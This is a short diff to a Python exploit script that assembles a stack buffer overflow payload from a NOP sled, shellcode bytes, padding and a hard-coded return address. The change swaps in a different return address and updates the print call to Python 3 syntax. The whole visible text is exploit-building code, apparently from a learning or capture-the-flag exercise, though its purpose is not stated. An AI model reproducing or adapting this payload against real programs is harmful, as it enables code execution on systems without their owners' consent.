@@ -32,6 +32,7 @@ shell_code += "\x06\x27\x18\xc0\x46\xc2\xde"
 PAD = 'X' * ((total_stack_size + base_pointer_length) - len(NOP) - len(shell_code))
 
 # Middle of the NOPs
-return_address = "\xa0\xdb\xff\xff\xff\x7f\x00\x00"
+# return_address = "\xa0\xdb\xff\xff\xff\x7f\x00\x00"
+return_address = "\x59\x51\x55\x55\x55\x55\x00\x00"
 
-print NOP + shell_code + PAD + return_address
+print(NOP + shell_code + PAD + return_address)
